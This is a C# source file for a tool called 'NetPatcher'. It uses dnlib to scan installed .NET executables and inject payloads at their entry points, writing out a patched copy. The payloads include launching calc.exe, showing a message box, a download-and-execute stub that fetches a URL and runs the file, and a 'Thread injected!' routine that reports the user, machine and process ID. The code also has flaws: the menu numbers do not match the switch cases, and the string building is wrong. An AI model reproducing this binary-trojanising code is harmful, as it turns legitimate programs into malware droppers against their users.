/* Author		: Gregory King
 * Date			: 07/16/25
 * Description	: This program is a .NET patcher that allows users to modify .NET applications to execute specific actions. The program will find compatible binaries in the Program Files, Program Files (x86) or user profile directories, and then applies the specified patch based on user input. The patched executable will be copied to the current directory with a new name. This version uses dnlib for binary manipulation. The patched program will execute the injected payload immediately when started. After the payload, the original program logic resumes, unless the payload itself interrupts or terminates execution (for example, if the payload throws an exception or calls Environment.Exit).
 */

using System;
using System.Collections.Generic;
using System.IO;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace NetPatcher
{ 
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Welcome to NetPatcher!");
            Console.WriteLine("Searching for .NET assemblies that are patchable... Please wait.");

			var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var searchDirs = new[] { @"C:\Program Files (x86)", @"C:\Program Files", userProfile };
            var assemblies = new List<string>();
            foreach (var dir in searchDirs)
            {
                try
                {
                    foreach (var file in Directory.EnumerateFiles(dir, "*.exe", SearchOption.AllDirectories))
                    {
                        try
                        {   
                            /* check if it's a .net assembly */
                            using (var module = ModuleDefMD.Load(file))
                            {
                                if (module.EntryPoint != null)
                                {
                                    assemblies.Add(file);
                                    if (assemblies.Count >= 50) break;
                                }
                            }
                        }
                        catch { }
                    }
                }
                catch { }
                if (assemblies.Count >= 50) break;
            }

            if (assemblies.Count == 0)
            {
                Console.WriteLine("No .NET assemblies found.");
                return;
            }

            Console.WriteLine("Select a .NET assembly to patch:");
            for (int i = 0; i < assemblies.Count; i++)
                Console.WriteLine($"{i + 1}: {assemblies[i]}");
            Console.Write("Choice: ");
            if (!int.TryParse(Console.ReadLine(), out int fileChoice) || fileChoice < 1 || fileChoice > assemblies.Count)
            {
                Console.WriteLine("Invalid choice.");
                return;
            }
            string path = assemblies[fileChoice - 1];

            Console.WriteLine("Select payload to inject:");
            Console.WriteLine("1. Execute calc.exe");
            Console.WriteLine("2. Download and execute file");
            Console.WriteLine("3. Show message box");
            Console.Write("Choice: ");
            var payloadChoice = Console.ReadLine();

            try
            {
                var module = ModuleDefMD.Load(path);
                var entry = module.EntryPoint;
                if (entry == null)
                {
                    Console.WriteLine("No entry point found.");
                    return;
                }
                var instrs = entry.Body.Instructions;

                switch (payloadChoice)
                {
                    case "1": /* pop calc */
                        var processStart = module.Import(typeof(System.Diagnostics.Process).GetMethod("Start", new[] { typeof(string) }));
                        instrs.Insert(0, OpCodes.Ldstr.ToInstruction("calc.exe"));
                        instrs.Insert(1, OpCodes.Call.ToInstruction(processStart));
                        instrs.Insert(2, OpCodes.Pop.ToInstruction());
                        break;

                    case "2":
						/* show message box */
						var showMsgBox = module.Import(typeof(System.Windows.Forms.MessageBox).GetMethod("Show", new[] { typeof(string) }));
                        instrs.Insert(0, OpCodes.Ldstr.ToInstruction("patched by NetPatcher"));
                        instrs.Insert(1, OpCodes.Call.ToInstruction(showMsgBox));
                        instrs.Insert(2, OpCodes.Pop.ToInstruction());
                        break;

					case "3":
						/* download and execute file */
						Console.Write("Enter URL to download: ");
						string url = Console.ReadLine();
						Console.Write("Enter filename to save as (e.g. C:\\Windows\\Temp\\payload.exe): ");
						string filename = Console.ReadLine();

						var webClientCtor = module.Import(typeof(System.Net.WebClient).GetConstructor(Type.EmptyTypes));
						var downloadFile = module.Import(typeof(System.Net.WebClient).GetMethod("DownloadFile", new[] { typeof(string), typeof(string) }));
						var processStart2 = module.Import(typeof(System.Diagnostics.Process).GetMethod("Start", new[] { typeof(string) }));

						instrs.Insert(0, OpCodes.Newobj.ToInstruction(webClientCtor));
						instrs.Insert(1, OpCodes.Dup.ToInstruction());
						instrs.Insert(2, OpCodes.Ldstr.ToInstruction(url));
						instrs.Insert(3, OpCodes.Ldstr.ToInstruction(filename));
						instrs.Insert(4, OpCodes.Callvirt.ToInstruction(downloadFile));
						instrs.Insert(5, OpCodes.Pop.ToInstruction());
						instrs.Insert(6, OpCodes.Ldstr.ToInstruction(filename));
						instrs.Insert(7, OpCodes.Call.ToInstruction(processStart2));
						instrs.Insert(8, OpCodes.Pop.ToInstruction());
						break;

					case "4":
   
    var typeDef = module.GlobalType;
    var injectedMethod = new MethodDefUser(
        "InjectCmd",
        MethodSig.CreateStatic(module.CorLibTypes.Void),
        MethodImplAttributes.IL | MethodImplAttributes.Managed,
        MethodAttributes.Public | MethodAttributes.Static
    );
    typeDef.Methods.Add(injectedMethod);

    var il = new CilBody();
    injectedMethod.Body = il;
    injectedMethod.Body.InitLocals = true;
    il.KeepOldMaxStack = true;

    /* typesig for system.diagnostics.process */
    var processTypeSig = module.Import(typeof(System.Diagnostics.Process)).ToTypeSig();
    var stringTypeSig = module.CorLibTypes.String;

    /* locals */
    var localMessage = new Local(stringTypeSig);
    var localProcs = new Local(new SZArraySig(processTypeSig));
    var localTarget = new Local(processTypeSig);
    injectedMethod.Body.Variables.Add(localMessage);
    injectedMethod.Body.Variables.Add(localProcs);
    injectedMethod.Body.Variables.Add(localTarget);

    /* imports */
    var msgBoxShow = module.Import(typeof(System.Windows.Forms.MessageBox).GetMethod("Show", new[] { typeof(string) }));
    var envUser = module.Import(typeof(System.Environment).GetProperty("UserName").GetGetMethod());
    var envMachine = module.Import(typeof(System.Environment).GetProperty("MachineName").GetGetMethod());
    var getProcessesByName = module.Import(typeof(System.Diagnostics.Process).GetMethod("GetProcessesByName", new[] { typeof(string) }));
    var procNameProp = module.Import(typeof(System.Diagnostics.Process).GetProperty("ProcessName").GetGetMethod());
    var procIdProp = module.Import(typeof(System.Diagnostics.Process).GetProperty("Id").GetGetMethod());
    var stringConcat2 = module.Import(typeof(string).GetMethod("Concat", new[] { typeof(string), typeof(string) }));
    var stringConcatObj = module.Import(typeof(string).GetMethod("Concat", new[] { typeof(string), typeof(object) }));

    /* preferred process names */
    string[] preferred = { "explorer", "notepad", "chrome", "firefox", "cmd", "calc" };
    var lblFound = new Instruction(OpCodes.Nop);
    var lblShowMsg = new Instruction(OpCodes.Nop);

    /* loop over preferred process names */
    foreach (var procName in preferred)
    {
        il.Instructions.Add(OpCodes.Ldstr.ToInstruction(procName));
        il.Instructions.Add(OpCodes.Call.ToInstruction(getProcessesByName));
        il.Instructions.Add(OpCodes.Stloc.ToInstruction(localProcs));
        il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcs));
        il.Instructions.Add(OpCodes.Ldlen.ToInstruction());
        il.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
        il.Instructions.Add(OpCodes.Brtrue.ToInstruction(lblFound));
    }

    /* if no process found, set message */
    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("No preferred process found."));
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
    il.Instructions.Add(OpCodes.Br.ToInstruction(lblShowMsg));

    /* if found, target = procs[0] */
    il.Instructions.Add(lblFound);
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcs));
    il.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
    il.Instructions.Add(OpCodes.Ldelem_Ref.ToInstruction());
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localTarget));

    /* build message string step-by-step */
    /* part1 = "Thread injected!\nUser: " + Environment.UserName */
    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("Thread injected!\nUser: "));
    il.Instructions.Add(OpCodes.Call.ToInstruction(envUser));
    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));

    /* part2 = part1 + "\nMachine: " */
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("\nMachine: "));
    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));

    /* part3 = part2 + Environment.MachineName */
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
    il.Instructions.Add(OpCodes.Call.ToInstruction(envMachine));
    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));

    /* part4 = part3 + "\nTarget Process: " */
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("\nTarget Process: "));
    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));

    /* part5 = part4 + target.ProcessName */
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localTarget));
    il.Instructions.Add(OpCodes.Callvirt.ToInstruction(procNameProp));
    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));

    /* part6 = part5 + "\nPID: " */
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("\nPID: "));
    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));

    /* part7 = part6 + target.Id */
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localTarget));
    il.Instructions.Add(OpCodes.Callvirt.ToInstruction(procIdProp));
    il.Instructions.Add(OpCodes.Box.ToInstruction(module.CorLibTypes.Int32));
    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcatObj));
    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));

    /* show message */
    il.Instructions.Add(lblShowMsg);
    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
    il.Instructions.Add(OpCodes.Call.ToInstruction(msgBoxShow));
    il.Instructions.Add(OpCodes.Pop.ToInstruction());
    il.Instructions.Add(OpCodes.Ret.ToInstruction());

    il.SimplifyBranches();
    il.OptimizeBranches();

    instrs.Insert(0, OpCodes.Call.ToInstruction(injectedMethod));
    entry.Body.KeepOldMaxStack = true;
    break;
					default:
                        Console.WriteLine("Invalid payload choice.");
                        return;
                }

                string patchedPath = Path.Combine(
                    Directory.GetCurrentDirectory(),
                    Path.GetFileNameWithoutExtension(path) + "_patched" + Path.GetExtension(path));
                module.Write(patchedPath);
                Console.WriteLine($"Patched .NET assembly saved as: {patchedPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error patching .NET assembly: {ex.Message}");
            }
        }
    }
}
